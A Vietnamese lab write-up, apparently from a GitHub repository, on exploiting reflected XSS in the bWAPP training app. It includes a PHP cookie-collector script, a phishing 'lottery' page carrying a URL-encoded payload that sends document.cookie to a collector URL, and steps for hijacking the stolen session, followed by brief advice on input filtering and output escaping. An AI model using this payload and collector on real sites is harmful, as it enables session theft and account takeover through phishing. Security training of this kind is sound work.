Bước 1: Xác định vị trí có thể dính XSS
Thử nhập họ tên và nhận được kết quả

![image](https://github.com/user-attachments/assets/34804180-fbab-4493-b02e-6a7296ad0bb2)

Kết quả trả về hiển thị ‘ Welcome Tran Van Thiep’. Từ đó có thể xác định có
khả năng bị dính lỗi XSS

Do là hoạt động theo phương thức GET nên có thể thấy dữ liệu được truyền đi 
kèm theo URL.

![image](https://github.com/user-attachments/assets/b2a93875-390a-4994-8316-65c6e540112f)

Bước 2: Kiểm tra lỗi XSS

Sau khi đã xác định được vị trí có khả năng mắc lỗi XSS, tiến hành kiểm tra 
bằng cách thử truyền vào 1 đoạn mã java script **<script>alert("XSS")</script>** để
thực hiện tạo 1 popup thông báo để kiểm tra xem site có bị lỗi XSS hay không?

![image](https://github.com/user-attachments/assets/8867814d-0762-40c0-a74a-6ec7c2a0430c)

Vậy là đã chắc chắn web vulnerable với XSS, ta sẽ tiến hành khai thác bằng kỹ thuật đánh cắp cookie:

Code php crawl cookie:

```php
<?php
    if(isset($_GET['cookie']))
    {
        $cookie = $_GET['cookie'];
        // Mở file cookie.txt, tham số a nghĩa là file này mở chỉ để write chứ không scan hay read
        $f=fopen('cookie.txt','a');
        // Ta write địa chỉ trang web mà ở trang đó bị ta chèn script.
        fwrite($f,$_SERVER['HTTP_REFERER']);
        // Ghi giá trị cookie
        fwrite($f,". Cookie la: ".$cookie." \n");
        // Đóng file lại
        fclose($f);
    }
?>
```

* Tạo một url phishing
```html
<html>
    <head>
        <title>Lottery</title>
    </head>
    <body>
	    <h1 align="center">CONGRATULATIONS!!!</h1>
	    <h1 align="center">YOU WON!!!</h1>
	    Click this <a href="http://localhost/bwapp/xss_get.php?firstname=%3Cscript%3Ewindow.open%28%22http%3A%2F%2Flocalhost%2Fget.php%3Fcookie%3D%22%2Bdocument.cookie%29%3C%2Fscript%3E&lastname=A&form=submit">link</a> to see your prize
    </body>
</html>
```
Phần bị mã hóa: 	   
```javascript
<script>window.open("http://localhost/get.php?cookie="+document.cookie)</script>
```

Tiếp theo, lừa người dùng click vào link phishing

![image](https://github.com/user-attachments/assets/b11b655f-febd-44f3-8afe-0df393e30ed0)

Khi mục tiêu ấn click vào link sẽ bị chuyển hướng tới web đã bị đệm javascript, sau đó sẽ bị crawl cookie về cookie.txt tại máy attacker:

![image](https://github.com/user-attachments/assets/7dd1b4e2-8b66-4523-847b-f93117a7cf0f)

Copy cookie và vào trình duyệt paste cái cookie này vào

![image](https://github.com/user-attachments/assets/1f7734b6-bfe2-4068-b3da-bf2efafca3c7)

Kết quả sau khi add cookie ta đã login mà không cần mật khẩu

![image](https://github.com/user-attachments/assets/79a836ee-6dcc-4d39-8b35-ae3dc4afbf0c)

### Cách khắc phục
+ Lọc và kiểm tra dữ liệu đầu vào
	- Đảm bảo rằng mọi dữ liệu đầu vào từ người dùng đều được kiểm tra và làm sạch trước khi được sử dụng trong trang web.

	- Xóa bỏ hoặc mã hóa các ký tự đặc biệt có thể được sử dụng trong tấn công XSS (như <, >, ", ', &).

	- Sử dụng các thư viện hoặc công cụ hỗ trợ như OWASP AntiSamy, DOMPurify để làm sạch đầu vào.

+ Thoát ký tự đầu ra
	- Đối với các ngôn ngữ kịch bản như HTML, JavaScript, thoát ký tự đặc biệt trước khi đưa dữ liệu từ người dùng ra trang web.

